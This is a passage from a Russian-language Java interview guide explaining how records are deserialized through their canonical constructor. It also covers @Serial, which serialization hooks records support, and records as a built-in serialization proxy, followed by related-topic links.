**Откуда берётся отличие.** Обычный класс JVM восстанавливает рефлексией, записывая значения прямо в поля и обходя конструктор. У `record` поля `final` и заданы каноническим конструктором, поэтому «вписать» в них значения нельзя — JVM вынуждена пойти другим путём и вызвать сам конструктор:

```
Обычный класс:   readObject → writeField(field1) → writeField(field2) → готово
Record:          readObject → вызвать канонический конструктор(arg1, arg2) → готово
```

**Это ключевое отличие:** валидация в каноническом конструкторе выполняется **при каждой десериализации**:

```java
public record PositiveRange(int min, int max) implements Serializable {
    public PositiveRange {
        if (min < 0 || max < 0) throw new IllegalArgumentException("negative!");
        if (min > max) throw new IllegalArgumentException("min > max");
    }
}

// При десериализации вредоносного потока с min=-1, max=5
// → будет выброшен IllegalArgumentException
// Для обычного класса — инвариант можно было бы нарушить!
```

**Аннотация `@java.io.Serial`** (Java 14+) — документирует и верифицирует методы сериализации:

```java
public record Config(String host, int port) implements Serializable {
    @java.io.Serial
    private static final long serialVersionUID = 1L;

    // @java.io.Serial на writeReplace — IDE/компилятор проверит корректность
    @java.io.Serial
    private Object writeReplace() {
        return new ConfigProxy(this);
    }
}
```

**Что недоступно для record при сериализации:**
- `writeObject`/`readObject` — игнорируются (но компилятор предупреждает)
- `readObjectNoData` — не применяется

**Что работает:**
- `writeReplace` / `readResolve` — полностью поддерживаются
- `serialVersionUID` — рекомендуется объявлять явно
- `ObjectInputFilter` — работает как обычно

**Record как Serialization Proxy «из коробки»:**

```java
// Это де-факто аналог Serialization Proxy Pattern
// Proxy и есть record-компоненты, канонический конструктор — это readResolve
public record Money(BigDecimal amount, Currency currency) implements Serializable {
    // Всё уже безопасно: canonical constructor = защищённая точка десериализации
}
```

---

## See also

- [Java IO / NIO](java-io-nio-interview.md) — `ObjectInputStream`/`ObjectOutputStream`, потоки байт и объекты
- [Java Core](java-core-interview.md) — контракт `equals`/`hashCode` и его роль при десериализации объектов
- [Java Exceptions](java-exceptions-interview.md) — `InvalidClassException`, `StreamCorruptedException` — типичные ошибки сериализации
- [ООП в Java](java-oop-interview.md) — `Serialization Proxy Pattern`, `readResolve()`, инварианты классов
- [Java Types](java-types-interview.md) — как `records` и `sealed classes` (Java 16-17) влияют на сериализацию
- [Java 17-21](java-17-21-interview.md) — сериализация `records` и `sealed classes` — новые подходы
- [Паттерны проектирования](../../design-patterns/design-patterns-interview.md) — `Serialization Proxy`, `Builder` для безопасной десериализации
- [Spring Framework](../../frameworks/spring/spring-framework-interview.md) — `@JsonIgnore`, `@JsonProperty`, Jackson-интеграция в Spring

- [Java 17-21](java-17-21-interview.md)
- [Java 8](java-8-interview.md)
- [Java Annotations](java-annotations-interview.md)
- [Java Collections](java-collections-interview.md)
- [Java Concurrency](java-concurrency-interview.md)
- [Java Conditional Statements](java-conditional-statements-interview.md)
